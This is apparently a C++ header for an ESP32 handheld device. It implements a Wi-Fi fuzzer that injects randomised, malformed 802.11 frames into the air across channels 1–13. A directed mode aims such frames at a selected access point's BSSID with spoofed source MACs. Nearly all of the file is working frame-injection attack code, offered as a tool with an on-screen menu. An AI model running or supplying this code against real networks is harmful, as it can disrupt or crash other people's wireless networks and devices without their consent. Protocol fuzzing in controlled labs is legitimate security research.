#ifndef FUZZER_MODULE_H
#define FUZZER_MODULE_H

#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"

extern uint8_t targetBSSID[6]; // Массив с MAC-адресом цели
extern int targetChannel;      // Канал выбранной сети
extern void updateDisplay(String msg); // Функция вывода текста


// Генерация случайного MAC-адреса
void getRandomMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = random(256);
    mac[0] &= 0xFE; // Устанавливаем Unicast (четный первый байт)
}

bool confirmAction(String message) {
  int choice = 0; // 0 - NO, 1 - YES
  delay(300); // Защита от дребезга

  while (true) {
    display.clearDisplay();
    display.drawRect(0, 0, 128, 64, SSD1306_WHITE); // Рамка
    
    display.setCursor(10, 10);
    display.setTextColor(SSD1306_WHITE);
    display.println("CONFIRM ACTION:");
    display.setCursor(10, 25);
    display.println(message);

    // Отрисовка кнопок
    if (choice == 0) { // Выбрано NO
      display.fillRect(10, 40, 45, 15, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(22, 44); display.print("NO");
      
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(82, 44); display.print("YES");
    } else { // Выбрано YES
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(22, 44); display.print("NO");
      
      display.fillRect(70, 40, 45, 15, SSD1306_WHITE);
      display.setTextColor(SSD1306_BLACK);
      display.setCursor(82, 44); display.print("YES");
    }

    display.display();

    // Навигация внутри подтверждения
    if (digitalRead(PIN_UP) == LOW || digitalRead(PIN_DWN) == LOW) {
      choice = !choice;
      delay(200);
    }
    
    if (digitalRead(PIN_SET) == LOW) {
      delay(300);
      return (choice == 1); // Возвращаем true, если выбрано YES
    }

    if (digitalRead(PIN_BACK) == LOW) {
      delay(300);
      return false; // Отмена
    }
    yield();
  }
}

// ОСНОВНАЯ ФУНКЦИЯ ФАЗЗИНГА
void runWifiFuzzer() {
    updateDisplay("FUZZING START\nCH: 1-13");
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);

    uint8_t packet[256]; // Буфер для "сломанного" пакета
    
    while (digitalRead(18) == HIGH) { // Пока не нажата кнопка BACK
        int ch = random(1, 14);
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

        int packetLen = random(24, 250); // Случайная длина пакета
        
        // 1. Формируем случайный заголовок (Frame Control)
        packet[0] = random(256); // Случайный Type/Subtype
        packet[1] = random(256); // Flags
        
        // 2. Генерируем случайные MAC-адреса (Dest, Source, BSSID)
        for (int i = 2; i < 24; i++) {
            packet[i] = random(256);
        }

        // 3. Заполняем Payload (тело пакета) мусором
        for (int i = 24; i < packetLen; i++) {
            packet[i] = random(256);
        }

        // 4. Инъекция пакета в эфир
        esp_wifi_80211_tx(WIFI_IF_STA, packet, packetLen, false);
        
        // Визуализация процесса
        if (millis() % 500 < 50) {
            display.clearDisplay();
            display.setCursor(0, 0);
            display.println(">> FUZZING AIR <<");
            display.printf("LEN: %d bytes\n", packetLen);
            display.printf("TYPE: 0x%02X\n", packet[0]);
            display.printf("CH: %d\n", ch);
            display.display();
        }
        
        yield();
        delay(30); // Пауза между "выстрелами", чтобы не повесить чип
    }
    esp_wifi_set_promiscuous(false);
}

// НАПРАВЛЕННЫЙ ФАЗЗИНГ (на конкретный роутер)
void runDirectedFuzzer(uint8_t* targetMac, int channel) {
    if (channel <= 0 || targetMac == NULL) {
        display.clearDisplay();
        updateDisplay("NO TARGET!\nScan & Select AP");
        delay(2000);
        return;
    }

    display.clearDisplay();
    updateDisplay("DIRECTED FUZZ\nTARGET LOCKED");
    delay(1000);

    unsigned long fuzzCount = 0;
    int currentCh = channel;       // Текущий рабочий канал
    unsigned long lastHop = millis(); 
    
    WiFi.mode(WIFI_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(currentCh, WIFI_SECOND_CHAN_NONE);

    uint8_t packet[250]; 
    
    while (digitalRead(18) == HIGH) { // PIN_BACK
        unsigned long now = millis();

        // --- ЛОГИКА СМЕНЫ КАНАЛОВ (раз в 2 секунды) ---
        if (now - lastHop > 2000) {
            currentCh = (currentCh % 13) + 1; // Переход 1-13
            esp_wifi_set_channel(currentCh, WIFI_SECOND_CHAN_NONE);
            lastHop = now;
        }

        int packetLen = random(24, 250);
        
        packet[0] = random(256); 
        packet[1] = random(256); 
        packet[2] = 0x00; 
        packet[3] = 0x00;

        for (int i = 0; i < 6; i++) {
            packet[4 + i] = targetMac[i];  // Destination
            packet[10 + i] = random(256);  // Source (fake)
            packet[16 + i] = targetMac[i]; // BSSID
        }

        for (int i = 24; i < packetLen; i++) {
            packet[i] = random(256);
        }

        if (esp_wifi_80211_tx(WIFI_IF_STA, packet, packetLen, false) == ESP_OK) {
            fuzzCount++;
        }
        
        if (now % 400 < 40) {
            display.clearDisplay();
            display.setCursor(0, 0);
            display.setTextColor(SSD1306_WHITE);
            display.println(">> TARGET FUZZ <<");
            display.printf("SENT: %lu\n", fuzzCount);
            display.printf("CUR CH: %d\n", currentCh); // Показываем текущий канал
            display.printf("TYPE: 0x%02X\n", packet[0]);
            display.setCursor(0, 54);
            display.println("HOLD BACK TO STOP");
            display.display();
        }
        
        yield();
        delay(10); 
    }
    
    esp_wifi_set_promiscuous(false);
    updateDisplay("Fuzzing Stopped");
    delay(500);
}

#endif
